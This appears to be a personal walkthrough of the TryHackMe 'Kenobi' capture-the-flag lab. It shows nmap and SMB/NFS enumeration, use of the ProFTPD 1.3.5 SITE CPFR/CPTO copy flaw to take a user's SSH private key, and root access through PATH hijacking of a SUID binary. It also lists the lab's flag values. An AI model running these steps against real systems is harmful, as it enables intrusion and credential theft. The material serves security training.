# 27 SEP 2021 | hussien Misbah | kenobi THM


export IP=10.10.215.96

# Scanning 

$ nmap -sV -v $IP -oN nmap/intial

```bash
PORT     STATE SERVICE     VERSION
21/tcp   open  ftp         ProFTPD 1.3.5
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
111/tcp  open  rpcbind     2-4 (RPC #100000)
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
2049/tcp open  nfs_acl     2-3 (RPC #100227)

```
$ nmap -sC -v  $IP -oN nmap/default_scripts

useful info from output :
```bash

samba version : Samba 4.3.11-Ubuntu
Computer name: kenobi

```

# enumeration 


port 80 :
---------
found /robots.txt 

visit :http://10.10.215.96/admin.html

"it is a trap"

- so it is just a rabbit hole .

port 445  :
----------

$ ./enum4linux.pl 10.10.215.96 

output :

```bash

//10.10.215.96/anonymous	Mapping: OK Listing: OK Writing: N/A

```

$ smbclient //10.10.215.96/anonymous     

smb:\> get log.txt


log.txt :

```

private key : /home/kenobi/.ssh/id_rsa
[anonymous]
path = /home/kenobi/share  ==> ftp running on 

```


port 111 :
---------

Your earlier nmap port scan will have shown port 111 running the service rpcbind. This is just a server that converts remote procedure call (RPC) program number into universal addresses. When an RPC service is started, it tells rpcbind the address at which it is listening and the RPC program number its prepared to serve. 

In our case, port 111 is access to a network file system. Lets use nmap to enumerate this.

```bash

$ nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.215.96

```

or 

```bash

$ showmount -e  10.10.215.96
Export list for 10.10.215.96:

/var *

```
so port 111 is making  /var as a server 


port 21 :
----------

version : ProFTPD 1.3.5

/home/kali/OSCP/5/exercise_2/grep_exploits.sh 'ProFTPD 1.3.5' 

3 exploits found 

# exploitation 

putting all this together ^^ 

hence we have access to /home/kenobi/share from the smb , and we know the path of id_rsa , Also we have exploit for version of ftp enables us to move a file to another location in the server , we can copy /home/kenobi/.ssh/id_rsa ==>  /home/kenobi/share/id_rsa , then we can get this file latter thanks to smb ! 



```bash

$ nc $IP 21                                

220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.215.96]
SITE CPFR /home/kenobi/.ssh/id_rsa
350 File or directory exists, ready for destination name
SITE CPTO  /home/kenobi/share/id_rsa
250 Copy successful

```
$ smbclient //10.10.215.96/anonymous

smb: \> get id_rsa

now we have it ! 


# access 

sudo ssh -i ida_rsa kenobi@$IP 


============================we are in ===============================


user flag > d0b0f3f53b6caa532a83915e19224899



# privilege escalation


$ find /  -user root -perm -4000 2>/dev/null


grep -Fxv -f suid_mine sudi_machine


+/usr/bin/menu  is odd 


path poisonning :
-------------------
hence in option 1 it will curl local host 
we can notice that from output or from strings command 

we can update PATH variable so it will search for curl at a palce from our choice before it search in default path 

```bash

kenobi@kenobi:~/share$echo "/bin/bash" > curl
kenobi@kenobi:~/share$chmod 777 curl 
kenobi@kenobi:~/share$export PATH=~/share:$PATH

```

* Setting 777 permissions to a file or directory means that it will be readable, writable and executable by all users

hence it will execute the /bin/bash as file owner which is "root" obviously ^^ 

we can have a bash root shell !


> root flag : 177b3cd8562289f37382721c28381f02



# done         
